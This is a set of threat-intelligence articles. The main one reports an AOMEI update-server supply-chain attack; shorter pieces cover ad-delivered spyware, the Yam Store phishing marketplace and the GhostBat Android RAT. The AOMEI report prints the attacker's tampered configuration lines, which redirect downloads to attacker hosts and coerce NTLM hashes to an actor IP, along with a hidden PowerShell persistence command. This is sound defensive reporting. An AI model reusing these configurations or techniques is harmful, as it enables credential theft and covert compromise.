Full Text:
Written by: Tyler McLellan

Introduction

Google Threat Intelligence Group (GTIG) and Mandiant investigated a software supply chain compromise campaign targeting the update infrastructure belonging to AOMEI Technology between April 2026 and July 2026. The threat actor conducted repeated, short-burst configuration tampering against AOMEI origin servers. Each tampering window remained active for only five to ten minutes before reverting to authentic versions. This is the first time that we have encountered a software supply chain compromise that was implemented with these very short windows, effectively evading traditional point-in-time triage and automated file scanning.

The campaign delivered a multi-stage payload chain involving the newly tracked CROSSROAD downloader and SHINYROAD backdoor. The threat actor iteratively modified its tradecraft, pivoting its staging infrastructure from cloud providers to dedicated domains and legitimate cloud storage. This evolving staging setup makes it particularly challenging for defenders to establish effective infrastructure-based blocking or network controls. We attribute this activity to a threat cluster we are tracking as UNC7017.

Based on available telemetry, impacted organizations spanned diverse sectors, including IT services, telecommunications, higher education and related entities in Australia, Brazil, India, Pakistan, Portugal, Singapore, South Africa, Spain, Switzerland, Türkiye, and the United States. That said, because the campaign attempted to deliver malware to any system polling the update distribution servers during the threat actor’s tampering windows, victimology was opportunistic and likely extends more broadly than the organizations we directly identified.

This campaign was initially identified through collaborative research with the ManageEngine Threat Analysis Lab (METAL), part of Zoho Corporation, whose endpoint detection and response (EDR) telemetry first detected the activity in late May across multiple customer environments. We thank the METAL team for their proactive telemetry sharing and ongoing collaboration to help secure our mutual customer bases and the broader software ecosystem. Following this joint effort, GTIG notified potentially affected organizations and shared technical findings with AOMEI Technology. AOMEI reported that they took corrective action to secure their distribution servers. METAL’s analysis of this campaign is available in their blog.

How AOMEI Update and Notification Systems Work

AOMEI Backupper provides data backup, disk cloning, and disaster recovery, while AnyViewer facilitates remote desktop access and support. Users of these products rely on the ABMarket update flow and its associated background services (Backupper.exe and ABNotify.exe) that periodically poll remote endpoints over HTTPS for update notifications and promotional pop ups:

Figure 1: AOMEI Update Mechanism

Update Configuration (down_html.ini): The software periodically sends an HTTPS request to https://www2.aomeisoftware.com/download/abpopup/down_html.ini. This file contains the version number, the MD5 hash of the expected update package, and the URL where the client should download upgrade-now.zip.

Notification Configuration (Notifycfg.ini): The software contacts https://account.aomeitech.com/Notifycfg.ini. This file instructs the local notification process (ABNotify.exe) what messages to display and specifies commands or programs located in the software’s local directory to execute.

Under normal conditions, these files direct the client to download official files hosted on AOMEI’s own domain (www2.aomeisoftware.com).

Campaign Overview

Rather than maintaining a persistent, static modification on the vendor’s distribution servers, GTIG and METAL’s telemetry indicates UNC7017 conducted repeated, short-burst configuration tampering. We confirmed several tampering windows in 2026, alongside related malware samples observed in the wild starting in late April. However, given the short duration of these windows, it is probable that additional tampering occurred throughout the campaign that remained outside our visibility. Systems checking for updates during an active window received malicious instructions, while systems checking before or after received clean, authentic files.

During the brief tampering windows, the threat actor modified the update settings file on the update server to redirect the software to download a malicious ZIP package from attacker-controlled servers instead of legitimate updates. The threat actor also altered the notification settings file on the update server to abuse the software’s automatic notification service, forcing the system to immediately execute the downloaded malware locally. If a user’s application checked for updates while the threat actor’s modifications were active, then the application would download the trojanized update and execute malware.

In cases where altered configuration files were active, the threat actor directed clients to download a weaponized ZIP archive containing CROSSROAD, an initial downloader responsible for environment validation and staging secondary components. CROSSROAD subsequently established scheduled task persistence to deploy SHINYROAD, a modular backdoor framework delivered via trojanized administration utilities to facilitate covert command and control.

Short Burst Supply Chain Tampering

A defining characteristic of UNC7017's operational security is its reliance on ephemeral, time-compressed server modifications. Across all directly observed waves, the adversary avoided leaving malicious configurations resident on AOMEI's update servers:

May 28: 10-minute exposure window (05:40 – 05:50 UTC)

July 16: 6-minute exposure window (08:33 – 08:39 UTC)

July 20: 5-minute exposure window (10:35 – 10:40 UTC)

At the conclusion of each window, UNC7017 reverted both down_html.ini and Notifycfg.ini to their legitimate contents. This hinders post-incident vendor audits, minimizes the window for network defenders to capture live malicious server responses, and restricts compromise to clients polling for updates during those exact minutes.

Weaponizing Native Update Logic: down_html.ini and Configuration Bloat

To compromise endpoints without relying on software vulnerabilities, UNC7017 abused the AOMEI client's legitimate update and popup rendering workflow. By default, the client downloads update archives into its Tmphtml directory, unpacks them to the local html/ directory, and processes instructions from two remote configuration files: down_html.ini and Notifycfg.ini.

To ensure the AOMEI client accepted and extracted the weaponized upgrade-now.zip archive, UNC7017 systematically incremented the minor build version (“thrid”) and updated the expected MD5 checksum in down_html.ini during each tampering window:

[Date] -Url=https://www2.aomeisoftware.com/download/abpopup/upgrade-now.zip +Url=https://promotion.storage-data.com/download/abpopup/upgrade-now.zip Name=upgrade-now [Version] maj=8 min=2 -thrid=5 +thrid=6 [MD5] -Val=EE89C99F3753231771170F5D9CBBAE1E +Val=31323E7E738230FA6A8DEEF2B7894666

Figure 2: July 16 tampering of down_html.ini redirecting downloads to promotion.storage-data.com with incremented version (thrid=6) and synchronized MD5 hash.

During the 6-minute window on July 16, UNC7017 simultaneously modified Notifycfg.ini (SHA256: d2f9ef2429312667f0512504b6a19ba4a9cc5514f1b2933923dd42f75a1c5934), injecting over 35,000 lines of repetitive configuration sections named [dummy_XXXXXX]. This extreme configuration bloat was structured to override standard client version checks forcing the client to trigger an update regardless of its installed version and immediately execute the unpacked CROSSROAD dropper (upgrade-now.exe) from the local html/ directory.

Infrastructure Shifts

Between April an July 2026, UNC7017 shifted its staging and delivery infrastructure between public cloud buckets and actor controlled lookalike domains, likely to test payload delivery and masquerade as legitimate vendor traffic.

Infrastructure Shifts

Early Cloud Staging (April–May 2026): Early CROSSROAD payloads (upgrade-now.exe observed May 20) relied on Alibaba Cloud Object Storage (serv.oss-cn-hongkong.aliyuncs.com).

Dedicated Domain Infrastructure (July 1–7, 2026): The threat actor transitioned to dedicated, vendor-themed domains (storage-data.com, promotion.storage-data.com, aomei.storage-data.com).

Hybrid Cloud Delivery Split (July 20, 2026): During the 5-minute window on July 20, the threat actor modified down_html.ini to direct initial client downloads to a public Google Cloud Storage bucket (storage.googleapis.com/aomeiupdate/upgrade-now.zip) rather than storage-data.com. This tactical shift allowed the initial download to bypass enterprise proxy filters that block Newly Registered Domains (NRDs), while the executed CROSSROAD loader continued to leverage storage-data.com for secondary payload retrieval and C2 communications.

[Date] Url=https://storage.googleapis.com/aomeiupdate/upgrade-now.zip Name=upgrade-now [Version] maj=8 min=2 thrid=7 [MD5] Val=BF73C4391B58CA95220CE3AE03F66DCF

Figure 3: July 20 modification of down_html.ini utilizing Google Cloud Storage (thrid=7) to evade Newly Registered Domain (NRD) perimeter blocks.

WebDAV NTLM Credential Coercion

On July 20, UNC7017 introduced a secondary exploitation vector inside Notifycfg.ini. Prior to tampering, Notifycfg.ini displayed a legitimate 400x380 promotional banner advertising "World Cup Deals." The threat actor replaced this banner with an invisible 1x1 pixel window (Width=1, Height=1) assigned maximum execution priority (Priority=9999) that instructed the client to render a remote HTML file over a universal naming convention (UNC) WebDAV path:

[PopWindow1] ID=307 Title=20260408-AB Flash Sale (All Lang 不含EN) Address="file://8.210.84.56/DavWWWRoot/campaign/24hour-flash-sale.html" Width=1 Height=1 Priority=9999

Figure 4: Malicious Notifycfg.ini configuration from July 20 implementing an invisible 1x1 popup window to coerce WebDAV/NTLM authentication to 8.210.84.56.

By forcing the AOMEI client to request a remote file:// resource via WebDAV (DavWWWRoot), UNC7017 created a silent credential harvesting mechanism capable of coercing endpoints into transmitting NetNTLMv2 authentication hashes to the actor-controlled IP address (8.210.84.56) without user visibility.

Malware Delivery & Post-Exploitation Tooling

Across the campaign waves, UNC7017 deployed a consistent chain of custom loaders and commercial/open-source post-exploitation frameworks:

Defense Evasion via Timestomping: Analysis of an early CROSSROAD dropper (upgrade-now.exe) submitted to VirusTotal on May 20 revealed that the threat actor manipulated PE compilation timestamps to display fabricated 2024 build dates in an effort to complicate forensic timeline analysis.

Modified Radmin Server Backdoor: During the May 28 wave, the unsigned loader dropped into the html/ directory executed rsetup64.exe /intsetup, silently installing a modified version of the commercial remote administration tool Radmin Server to establish persistent remote access.

Adaptix C2 Integration: Since at least early July 2026, the threat actor was observed deploying the Adaptix C2 framework across its storage-data.com infrastructure.

The Primary Downloader: CROSSROAD

The primary Stage-2 downloader (upgrade-now.exe, SHA256: 9a58e8f49edf5644e5728f74cf36f560d3d486fa51db4db69d927963c7aca450) is a 64-bit Windows executable written in C, tracked by GTIG as the CROSSROAD malware family. Delivered inside upgrade-now.zip, CROSSROAD is responsible for environment validation, active endpoint cleanup, staging the secondary payload bundle, and establishing scheduled task persistence for the Stage-3 backdoor suite.

Path Verification: As part of its configuration routine, CROSSROAD checks whether its file path contains the substring AOMEI. If the substring is absent, it initiates a self-deletion routine; however, it does not abort, continuing both its background configuration cleanup and its downloader routines regardless.

Execution Guardrails: Before proceeding with secondary downloads, CROSSROAD enforces two primary checks:

Geolocation Check: Queries external domain name system (DNS) (myip.opendns.com, o-o.myaddr.l.google.com) and HTTP reflection services (checkip.amazonaws.com, api.ipify.org, ifconfig.me/ip, icanhazip.com) using custom User-Agents (Anyviewer-loader/1.0, Anyviewer-ipcheck/1.0). In specific execution branches, if the returned country code is "CN" (China), the loader aborts its primary payload execution path.

Lock Mutex: Acquires the named mutex Global\{F9E6E3C0-E11A-4F85-9944-AF4AD6E05883} to prevent multiple concurrent instances on the same host.

Host Artifact Reversion & Anti-Forensics: To complicate post-incident triage and forensic reconstruction, the loader systematically reverts local configuration states during its execution cycle. The malware parses down_html.ini (located at <install_dir>\..\..\), restoring the update thread parameter (thrid) to its default value of 5 and pointing the update download URL back to legitimate AOMEI distribution infrastructure (https://www2.aomeisoftware.com/download/abpopup/).

Stage-3 Payload Staging & Extraction: If environment checks pass, CROSSROAD downloads https://promotion.storage-data.com/config/component.zip (also observed as en.zip), to %TEMP%\svc<random_hex>.tmp, and unpacks its contents into the user’s local application data directory using an embedded miniz library.

Persistence via Scheduled Task: To ensure continuous execution of the staged payload bundle, upgrade-now.exe registers a persistent scheduled task named RadminComponentRuntime (configured with the description”Radmin Component runtime checkable.”). The task is set to execute %LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk every three hours.

Self-Deletion (--nitrod): After extracting the payload bundle and creating the scheduled task, CROSSROAD purges itself from disk. To bypass Windows file-locking constraints, the executable drops a copy of itself to the temporary directory and executes it with the --nitrod parameter, passing its parent PID via NITRODP and original executable path via NITRODT. The child process waits for the parent to terminate, renames the original binary's primary :$DATA stream to an alternate data stream named :wtfbbq via SetFileInformationByHandle, and flags FileDispositionInfo with DeleteFile = TRUE to unlink the binary on handle close.

Version Information: The executable contained standard PE version metadata with a notable typo string: "ProductName: AOMEI Update Compent".

Figure 5: Victim Profiling, Malware Delivery Logic

Stage-3 Payload: SHINYROAD and Radmin Suite

The payload archive unpacked into %LOCALAPPDATA%\Radmin\ by CROSSROAD contains a Famatech Radmin 3.x administration bundle used to deliver the SHINYROAD modular backdoor framework. The malware contains no native persistence mechanism of its own and relies entirely on the external scheduled task registered by CROSSROAD for execution.

Execution via DLL Search-Order Hijacking (BlkScrDl.dll): Execution begins when the persistent RadminComponentRuntime scheduled task launches the legitimate, signed Radmin binary %LOCALAPPDATA%\Radmin\FamItrfc.exe --runtimechk (or FamItrf2.exe). During startup, the Radmin executable is hijacked into loading the attacker's unsigned DLL, BlkScrDl.dll, via search-order hijacking. The adversary named this DLL to masquerade as Radmin's legitimate "blank screen" driver library.

Shared Memory & In-Process COM Server Staging: Upon execution, BlkScrDl.dll locates config.zip in its execution directory, maps its raw contents into a shared memory section named Local\963d3c60-d406-4ad6-aa1e-dc8e45061ccf, and dynamically registers csvc\RuntimeComponent.dll as an in-process COM Server under CLSID {21191641-0D7F-4CD9-9572-01AAE6E7851B} and AppID {9AD3E98A-4C7E-4F37-982D-D73D41E4F91B}.

COM-Triggered Stage-2 Initialization & Embedded PocketPy VM: When the Radmin process instantiates the registered CLSID, the Windows COM subsystem loads the DLL. The DLL reads config.zip directly from shared memory, extracts the encrypted payload metadata.dat, and decrypts it using ChaCha20 with an HMAC-SHA256 derived key and IV. The decrypted payload consists of compiled Python bytecode, which RuntimeComponent.dll executes within an embedded PocketPy interpreter, establishing initial C2 connectivity to 8.218.65.184:443.

Evolution of the SHINYROAD Architecture

Analysis of earlier campaign variants revealed that SHINYROAD relies on custom C-level extensions (_pyio_compat, _pyio_struct, and pkpy) to avoid loading standard Python libraries on disk:

Custom Binary C2 Protocol: Earlier variants communicated over raw TCP (8.218.65.184:41397). The agent generates a unique ID by fingerprinting the hostname and username, authenticates via a hard-coded handshake key, and dynamically transitions all subsequent communication to use symmetric encryption derived from this unique ID.

In-Memory Capabilities: The engine supports interactive remote shell access (os.system), traffic chaffing (generating randomized junk packets to disrupt network signatures), and dynamic in-memory extension via the pkpy WorkPool thread manager without writing script modules to disk.

Post-Exploitation: Nitro PDF Theme & Adaptix C2

In mid-July 2026, following the successful deployment of SHINYROAD, telemetry identified later-stage activity where UNC7017 pushed down ADAPTAGENT, the client portion of the Adaptix C2 post-exploitation framework. To blend in or appear as user-downloaded activity, these payloads masqueraded as Nitro PDF promotional and scanning tools (NitroPromotion.exe):

Persistence: The malware installed a scheduled task named \NitroRuntime that executed:

powershell -Command "Start-Process 'C:\Users\<USER>\AppData\Local\Temp\NitroPromotion.exe' -WindowStyle Hidden"

Figure 6: NitroRuntime scheduled task persistence

Adaptix C2 Beaconing: The executable sideloaded Eztwain4.dll (ADAPTAGENT) from %LOCALAPPDATA%\Nitro Pro\, which established periodic 2-minute beacons to 8.210.84.56:6800.

Outlook and Implications

This campaign highlights a broader evolution in software supply chain attack methodologies. Supply chain intrusions have historically focused on inserting backdoors into software source code or tampering with developer build pipelines (e.g., SolarWinds, 3CX). While highly impactful, compromised source trees leave persistent binary signatures in official release files that can be discovered during post-release binary analysis.

UNC7017's use of ephemeral configuration tampering represents a lower-overhead, higher-stealth alternative:

Anti-Analysis by Design: By restricting configuration changes to five to ten minute windows, the vast majority of legitimate users and automated repository crawlers only encounter authentic, vendor-signed files.

Selective Exploitation: Threat actors can selectively compromise target organizations that maintain frequent polling intervals while minimizing their exposure window on vendor infrastructure.

Dual-Pronged Approach: Combining software update redirection with invisible WebDAV NTLM coercion could allow adversaries to harvest credentials from passive users even if binary payload execution is blocked.

Co-opting Commercial Software: Deploying unmodified versions of legitimate administration tools (such as Radmin 3.x) to masquerade sideloaded covert channels illustrates how adversaries blend commercial remote management capabilities with hidden backdoor modules.

Remediation and Hardening

Defenders should focus on behavioral profiling of updater processes, specifically monitoring for unsigned child processes spawned by background update runners and unauthorized network redirection originating from trusted desktop software. For broader recommendations on securing software delivery pipelines, please refer to our previously published Mitigation Guidance for Supply Chain Compromise.

Vendor Notification & Architecture Hardening

On July 17, 2026, Mandiant notified AOMEI Technology regarding the observed configuration tampering on their update infrastructure and provided relevant indicators. AOMEI subsequently responded on July 29, 2026, stating that corrective actions had been taken.

Why Server-Side Remediation Does Not Disinfect Endpoints

Crucially, server-side remediation does not clean endpoints that downloaded malicious updates during earlier tampering windows. Because the tampering occurred in brief, short bursts, systems that received these files may remain compromised without the organization's knowledge unless proactive endpoint hunting and remediation are performed.

Persistent Resident Payloads: Endpoints that polled for updates during an active tampering window downloaded and staged persistent payloads (via scheduled tasks) that remain fully operational even after the vendor restores authentic .ini files on the origin servers.

Obscured Root Cause: While the subsequent backdoor activity and scheduled tasks generate detectable endpoint telemetry, the ephemeral delivery vector obscures the initial intrusion mechanism. Because server tampering lasted approximately 5 minutes—and the loader actively reverted local configuration files—investigators reviewing vendor update URLs hours later will observe only benign, authentic infrastructure, complicating root cause analysis and patient-zero identification.

Hunting Imperative: Organizations running AOMEI software cannot assume they are protected solely because the vendor took corrective server-side action. Enterprise security teams must perform retrospective endpoint and network hunts across the entire April–July time frame using the indicators and YARA rules provided in this post.

Guidance for Software Vendors & Developers

Software supply chain security extends beyond developer workstations and build pipelines. When desktop software relies on remote configuration files to manage update and notification behaviors, adversaries can target the distribution layer rather than the source code. To defend against configuration tampering and distribution-channel hijacking, software vendors should implement the following security controls:

End-to-End Cryptographic Signature Verification: Client applications must cryptographically verify Authenticode digital signatures and validate vendor certificates on all downloaded executables and archives before extraction or execution. Update clients should never rely solely on transport-layer HTTPS or remote checksums (such as cleartext MD5 values in an unauthenticated configuration file).

Cryptographically Signed Configuration Files: Remote configuration files (.ini, .json, or .xml) should be digitally signed using asymmetric public key cryptography. If an origin server or content delivery network (CDN) is modified without authorization, client software will detect the invalid signature and reject the configuration.

Domain Allowlisting and Destination Pinning: Software update clients should enforce strict destination pinning, restricting update downloads exclusively to official, pre-approved vendor domains and CDNs. Update engines should reject redirection to arbitrary third-party domains or generic public cloud storage buckets.

Restricting Uniform Resource Identifier (URI) Schemes in In-App Handlers: Embedded web views, promotional popups, and notification handlers should strictly enforce secure web protocols (https://) and explicitly disallow local file (file://) and UNC WebDAV schemes to prevent external NTLM credential coercion.

Decoupling Core Updates from Marketing Channels: Separating essential software maintenance routines from dynamic promotional popups and notification banners reduces the attack surface and ensures that advertising channels cannot trigger local code execution.

Origin Integrity Monitoring and Access Controls: Origin web servers and object storage buckets hosting update metadata should enforce strict access controls, multi-factor authentication, and automated real-time file integrity monitoring (FIM) with immediate alerting on configuration changes.

Guidance for Security Operations (SOC) & Incident Responders

Overcoming the "Point-in-Time" Triage Pitfall

The short-burst nature of this attack creates a unique challenge for incident response:

The Triage Trap: When an EDR alert fires for a suspicious process spawned by an updater, SOC analysts frequently attempt to validate the alert by navigating to the vendor's download URL or checking URL reputation. Because the threat actor reverted the remote configuration files within five to ten minutes, the vendor's server returns authentic, clean files most of the time, leading analysts to mistakenly dismiss the detection as a false positive.

Actionable IR Protocol: Defenders must not rely on live web checks. Incident responders must preserve and analyze the endpoint-cached configuration files in %PROGRAMFILES(X86)%\AOMEI\*\Tmphtml\ and review proxy/firewall telemetry corresponding to the precise second the alert was triggered.

Camouflaged Follow-on Activity

The deployment of Adaptix C2 under the guise of Nitro PDF can mislead analysts into treating alerts as isolated, user-initiated software downloads rather than staged lateral movement. Responders must trace updater parentage to identify root-cause supply chain tampering.

Title: ‘Nightmare Scenario’: Zero-Click Spyware Is Infecting Phones via Targeted Ads
Context: But attackers have also exploited the sprawling infrastructure of the online ad ecosystem to distribute malware, sometimes with little or no interaction needed from victims
Full Text:
On Thursday, researchers from The Citizen Lab at the University of Toronto revealed a worst-case scenario found in the wild: spyware silently infecting targets as they browse past ads in their daily digital lives.

Dubbing the attacks “AdFection,” the researchers documented a campaign in which an Israeli-registered advertising firm allegedly connected to the servers linked to a spyware company and infected dozens of devices with its invasive malware. Citizen Lab believes this to be the first detailed technical evidence made publicly available of sophisticated spyware infecting devices via digital ads.

Zero-click hacks are a holy grail for attackers and catastrophic for victims, because they can automatically install malware on devices without requiring any interaction or missteps from the target. When sophisticated hackers have deployed rare zero-click attacks in recent years, they have often exploited vulnerabilities in mobile messaging and communication apps to infect victims. But attackers have also exploited the sprawling infrastructure of the online ad ecosystem to distribute malware, sometimes with little or no interaction needed from victims. Evidence of the zero-click spyware campaign that Citizen Lab’s researchers uncovered shows the two threats merging, underscoring the extent and urgency of the risk.

“AdFection allows operators to automatically hack specific individuals with mercenary spyware as they use apps or browse the internet,” says Bill Marczak, a senior researcher at Citizen Lab. “Someone who gets hacked like this would not see anything amiss. In fact, they might not even see any ad at all.”

The situation is so concerning, he notes, because there isn’t much that people can do to protect themselves from zero-click ad attacks other than blocking ads as thoroughly as possible on all websites and platforms—a fact that intelligence agencies like the NSA and CIA seem to know all too well.

“The risk of having your device infected with spyware simply by using a website or app that displays ads is a nightmare scenario,” says Wolfie Christl, a senior Citizen Lab researcher.

During 2024 and 2025, Citizen Lab concluded that 45 devices belonging to the news outlet Al Jazeera were targeted with zero-click attacks delivered by ads. The researchers say that the targeted ads were issued by the Israeli-founded marketing firm Discover-Tech and distributed spyware attributed to the Israeli developer Candiru. Infected devices had contact with domains linked to Discover-Tech and then connected to infrastructure associated with Candiru, according to Citizen Lab’s analysis. (Al Jazeera, which participated in the investigation and shared device logs with Citizen Lab researchers, did not respond to a request for comment.)

“The ability to push individualized, arbitrary content at specific users is a hallmark of the modern online ads ecosystem, and is perfectly suited to the mercenary spyware industry,” Marczak says. “Until this architecture changes, or ad companies get serious about customer vetting, we’re going to keep seeing this kind of abuse.”

Emails and messages sent to Discover-Tech and its CEO by WIRED did not receive a response before publication. Integrity Partners, which is believed to own Candiru’s assets, following sanctions by the US government in 2021, also did not respond to requests for comment.

Google, which operates one of the world’s largest advertising businesses, terminated Discover-Tech’s registration after collaborating with Citizen Lab and researchers from the cybersecurity firm Confiant and confirming a spyware link. “Following a joint investigation with Citizen Lab and Confiant, Google blocked Discover-Tech from our ad platforms for systematically violating our policies,” a Google spokesperson says. “We also set up Safe Browsing warnings to help protect people if they navigate to websites linked to this group.”

The European branch of the Interactive Advertising Bureau (IAB), an ad industry body, confirmed to WIRED that it has suspended Discover-Tech from its global vendor list, known as the GVL. The company was suspended by IAB Europe following an audit of its policies, it says. “Further confirmation of the findings regarding spyware could also justify a definitive expulsion from the GVL,” a spokesperson for IAB Europe says.

A spokesperson for Beeswax, an online advertising industry company owned by Comcast, says in a statement: “Beeswax removed Discovery-Tech from our platform following recent activity and independent validation by a third-party security specialist. We maintain a zero-tolerance policy for malicious advertising.”

Often when you see ads online or in apps, they’re displayed following a complex process known as real-time bidding—essentially an automated auction where advertisers place bids to show you specific ads. The milliseconds-long process can result in advertisers collecting huge volumes of data about your device, your location, and browsing history, plus a whole lot more. The process has been a privacy nightmare for years, with murky data brokers selling people’s personal information, and law enforcement agencies and hostile nations buying it to track or target people.

The Citizen Lab researchers say that Discover-Tech operates an advertising platform, Controlium, that can allow its users to “de-anonymize, fingerprint, and automatically infect devices” once an ad appears. Overall, the researchers estimate that millions of devices were directed to Candiru’s servers, where they could be profiled. By analyzing ad-bidding records that were publicly exposed on the Discover-Tech website, the Citizen Lab researchers say, ads linked to the firm with attacker script tags were shown in more than 70,000 mobile apps and more than 120,000 websites between March and June this year. Multiple apps, the researchers say, displayed more than a million ads linked to Discover-Tech.

The firm’s ads weren’t necessarily all weaponized to potentially distribute spyware, but the researchers say that, in general, they have seen Discover-Tech ad impressions on government and national-security-linked networks around the world. These include NATO and United Nations networks, as well as lawmaking bodies in Europe, critical infrastructure providers in Australia, plus armed forces and government agencies in Norway and Sweden.

Previous zero-click targeted ad campaigns that distribute spyware have rarely surfaced publicly, but the Citizen Lab researchers say this is likely a symptom of ad infrastructure being so extensively trusted and incorporated in all aspects of digital life without specific oversight.

“The network logs from Al Jazeera were key in understanding the ad-based nature of that attack,” Marczak says. “If a user’s personal device were targeted, say, while they were connected to their home Wi-Fi or mobile data, there’s not going to be the same level of network monitoring there. So I think the lack of prior reporting is probably mainly a visibility issue: Defenders have to be in the right place at the right time, looking at the right data.”

Speaking generally about threats that can result from the sheer ubiquity of the digital ad ecosystem, Jason Kint, CEO of the digital media trade organization Digital Content Next (WIRED parent company Condé Nast is a member), says these kinds of attacks are both plausible and damaging.

“Although rare and sophisticated, I wouldn’t be entirely surprised to learn about zero-click attacks through ads,” Kint says. “Anything that goes directly against users’ expectations or lowers the trust in the open web is deeply concerning.”

Microsoft Disrupts Global Yam Store Network Behind One Billion Phishing Messages

UK / EMEA News Reporter, Infosecurity Magazine

Microsoft has teamed up with industry and law enforcement partners to disrupt a major phishing infrastructure network which has targeted tens of thousands of organizations worldwide since January.

In a report published on October 14, Microsoft detailed how its work with Japanese police soon unravelled a network of Chinese-language phishing-as-a-service (PhaaS) kit operators, developers, and a marketplace selling tools and infrastructure.

“Threat actors purchased and used these tools and infrastructure, including phishing kits and access to compromised or fraudulent Microsoft or Google cloud environments and related credentials, to target organizations across the healthcare, financial services, wholesale distribution, and IT sectors in Japan, the US, Australia, and India,” it explained.

The phishing kits alone have been responsible for over a billion phishing emails and texts sent to over 75,000 organizations since January 2026, it added.

Read more on global phishing infrastructure: Global Takedown Neutralizes Tycoon2FA Phishing Service

The network centers around Yam Store, an underground marketplace tracked by Microsoft as Storm-3119.

Yam Store sells fraudulently obtained or compromised Microsoft and Google domains as well as offering three phishing kits: CoGUI (aka NX or FA), Haozi (aka Phoenix), and Iron Man System. The latter three kits are grouped under Storm-2990.

In terms of the phishing infrastructure, Yam Store operators found internet domains that legitimate organizations had allowed to expire.

“They then rebuilt the websites to make those organizations appear active, allowing them to fraudulently obtain Microsoft 365 accounts that could later be sold through Yam Store,” another Microsoft writeup explained.

“Storm-3119 resells the hijacked accounts, licenses, and storage through an automated storefront, operating as the access broker that supplies these resources to downstream operations.”

On other occasions, the group created fake organizations, likely using AI-generated content and forged documents, to establish Microsoft tenants.

Yam Store sells the phishing infrastructure outlined above alongside the Storm-2990 kits.

“They are designed to impersonate organizations across several industry verticals to steal information, including sign-in credentials (usernames, passwords) and financial data (credit card information), used to gain access to network environments,” Microsoft said.

The lures focus on subjects like unpaid tolls and traffic fines, parcel-delivery issues, bank and government impersonation and fake login pages. The goal is credential stealing, device code phishing, and use of stolen payment data “to make fraudulent purchases of high-end goods or fraudulent transactions on legitimate financial platforms.”

It’s unclear how many consumers, as well as organizations, were targeted by Storm-2990 and Storm-3119 The kits feature a number of advanced evasion techniques including geofencing, fake CAPTCHA gates, and anti-detection configurations, the report claimed.

“Microsoft has already disabled more than 20,000 accounts connected to YAM Store and continues to dismantle the operation by removing infrastructure hosted on its services and blocking more than 100,000 domains used for impersonation and fraud,” the tech giant noted.

Title: The GhostX Ecosystem: Forged in Transit, Licensed to Deceive

Executive Summary

Cyble has continued tracking GhostBat RAT activity targeting Android users in India since its initial identification in October 2025. Recent investigations into malicious mParivahan and eChallan-themed applications revealed a broader operator-controlled ecosystem that we track as GhostX.

Analysis of the exposed GhostX backend identified administrative and user-management structures, device-control records, SMS-delivery instructions, call-forwarding activity, and continuously changing phishing content, indicating active campaign management.

Impressions

The latest GhostBat RAT variant represents a significant evolution in both delivery and post-compromise capabilities. The malware now abuses the Android Accessibility Service to support Ghost Overlay and broader PIN/key-input capture targeting financial applications used across India.

Ghost Overlay transparently intercepts PIN keypad interactions in Google Pay and MobiKwik. It replays the same touches into the legitimate application, allowing the malware to capture PIN information without presenting a conventional phishing interface. The variant also targets 60 banking, UPI, wallet, fintech, and payment applications for broader PIN capture.

Modus Operandi

GhostBat RAT has diversified its loader architecture, with at least six observed delivery mechanisms, while the latest build uses libnetbridge.so and multiple cryptographic and custom container stages. Firebase Remote Config further enables operators to dynamically modify C&C infrastructure and malware functionality after installation.

Figure 1 – GhostBat RAT Infection Chain

Key Takeaways

GhostBat RAT continues to target Android users in India via mParivahan- and eChallan-themed smishing campaigns, using phishing pages and public hosting platforms to distribute malicious APKs.

Our investigation uncovered GhostX, a broader operator-controlled ecosystem that supports phishing, device management, backend configuration, and the distribution of the GhostBat RAT.

The latest GhostBat RAT variant abuses the Android Accessibility Service, including the Ghost Overlay technique to intercept PIN entry in legitimate Google Pay and MobiKwik applications.

The malware also implements broader PIN/key-input capture targeting 60 Android applications associated with India’s banking, UPI, wallet, fintech, and digital-payment ecosystem.

GhostBat RAT’s delivery layer has evolved through multiple loader and dropper implementations, with the latest libnetbridge.so loader employing several transformations, including encryption, compression, and custom container stages, before recovering the final payload.

Firebase Remote Config enables dynamic C&C and feature management, allowing operators to modify backend infrastructure and selected malware capabilities without rebuilding or redistributing the APK.

Overview

In October 2025, Cyble identified GhostBat RAT being distributed through MiningDropper and targeting Android users in India.

We have since continued to track related activity and investigate malicious applications impersonating India’s mParivahan and eChallan services. This research uncovered a broader Android threat ecosystem that we track as GhostX, along with significantly evolved variants of GhostBat RAT.

The most recent GhostBat RAT variant demonstrates a notable increase in capability and operational flexibility. It uses Firebase Remote Config to dynamically manage command-and-control (C&C) infrastructure and to enable or disable individual malware modules without requiring APK redistribution.

This variant also implements a sophisticated Ghost Overlay technique targeting legitimate Google Pay and MobiKwik PIN-entry interfaces. Instead of displaying a conventional fake login page, the malware places transparent accessibility overlays over the legitimate application’s keypad, records the victim’s touch selections, and replays the same interaction into the genuine application.

Additionally, the malware implements a PIN-capture capability through keylogging, targeting 60 Android applications across India’s banking, UPI, wallet, fintech, and digital payment ecosystem.

The malware’s delivery and packing mechanisms have evolved considerably across the samples analyzed. We identified at least six distinct loader or dropper implementations, including:

Native AES-CBC-protected APK containers

Custom SPKZ/SPK1 payload formats

Java-based in-memory DEX loaders

Remote APK downloaders

Multi-stage XOR/AES loaders

A newer native libnetbridge.so loader using multiple cryptographic, transformation, compression, and custom container stages before recovering the final payload

This diversification suggests continued investment in defeating static detection and complicating automated malware extraction.

GhostBat RAT is primarily distributed via smishing messages that contain malicious links. When victims follow these links, they are redirected to phishing pages that impersonate either the legitimate Parivahan service or a Google Play-style application download page and are encouraged to install a fraudulent mParivahan APK (see Figures 2 and 3).

During our investigation, we also repeatedly observed GitHub repositories and GitHub-hosted assets being used to distribute malicious APKs, providing attackers with readily available public hosting infrastructure.

Figure 2 – Fake Google Play Store-style mParivahan installation website

Figure 3 – Fake mParivahan website prompting to download APK file

Discovery of the GhostX Ecosystem

The GhostX investigation began with the discovery of multiple Android applications impersonating India’s mParivahan and eChallan ecosystem.

Samples were collected from phishing infrastructure and public GitHub repositories containing APKs named or presented as mParivahan, vehicle-challan, traffic-enforcement, or other related government applications.

Initial static analysis revealed that many of these APKs were only first-stage loaders. Their visible DEX code offered limited functionality, while the actual malware payload was either concealed within encrypted assets or retrieved later.

After unpacking the applications to their final payloads, we identified multiple custom C&C infrastructures, Firebase projects, and overlapping Android surveillance and financial-fraud capabilities.

A major breakthrough came from the analysis of a NextGen mParivahan sample whose unpacked payload contained the Firebase project identifier:

ghostx-panel

The exposed Firebase backend provided significantly greater visibility into the operator’s infrastructure and control workflow. The database contained structures including:

clients

bot_users

admins

admin_logins

settings

All_Users

Verify_Device

